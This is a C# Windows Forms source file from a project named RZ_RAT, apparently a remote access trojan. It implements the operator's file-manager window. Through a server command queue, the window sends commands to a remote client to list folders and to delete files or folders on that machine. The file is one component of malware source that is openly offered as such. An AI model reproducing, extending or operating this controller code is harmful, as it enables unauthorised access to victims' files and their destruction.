using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace RZ_RAT
{
    public partial class FileManger : Form
    {
        public string[] client = null;
        public FileManger()
        {
            InitializeComponent();
        }

        private void listView1_ItemSelectionChanged(object sender, ListViewItemSelectionChangedEventArgs e)
        {
            if (e.Item.Selected)
                Form1.ServerObject.addCommand(client, "getfilesandd<<>>" + e.Item.Tag.ToString());
        }

        private void FileManger_Load(object sender, EventArgs e)
        {

        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

            Form1.ServerObject.addCommand(client, "getfilesandd<<>>" + ((ComboBox)sender).SelectedItem.ToString());
        }
        public void addtolistview(string[] FilesAndFolders)
        {
            ListViewItem lvii = new ListViewItem("",2);
            lvii.SubItems.Add("..");
            label1.Text = "Path : " + FilesAndFolders[0];
            string[] ssss = FilesAndFolders[0].Split(new string[] {"\\"},StringSplitOptions.None);
            lvii.Tag = string.Join("\\", ssss.Where((o, i) => i != ssss.Length - 1).ToArray());
            listView1.Items.Add(lvii);
            foreach (string Files in FilesAndFolders)
            {
                string[] file = Files.Split(new string[] { "|" }, StringSplitOptions.None);
                if (file.Length == 1){}else
                {
                    ListViewItem lvi;//new ListViewItem();
                    try
                    {
                        if (file[2] == "f")
                        {
                            lvi = new ListViewItem("", 0);
                            lvi.SubItems.Add(file[0]);
                            lvi.SubItems.Add(file[1]);
                            lvi.Tag = FilesAndFolders[0] + "\\" + file[0];
                        }
                        else
                        {
                            lvi = new ListViewItem("", 1);
                            lvi.SubItems.Add(file[0]);
                            lvi.Tag = FilesAndFolders[0] + "\\" + file[0];
                        }
                    }
                    catch
                    {
                        lvi = new ListViewItem("", 1);
                        lvi.SubItems.Add(file[0]);
                        lvi.Tag = FilesAndFolders[0] + "\\" + file[0];
                    }
                    listView1.Items.Add(lvi);
                }
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lvi in listView1.SelectedItems)
            {
                //MessageBox.Show(lvi.Tag.ToString());
                Form1.ServerObject.addCommand(client, "deletefileorfolder<<>>" + lvi.Tag.ToString());
            }
         
        }

        private void listView1_MouseDoubleClick(object sender, MouseEventArgs e)
        {

        }
    }
}
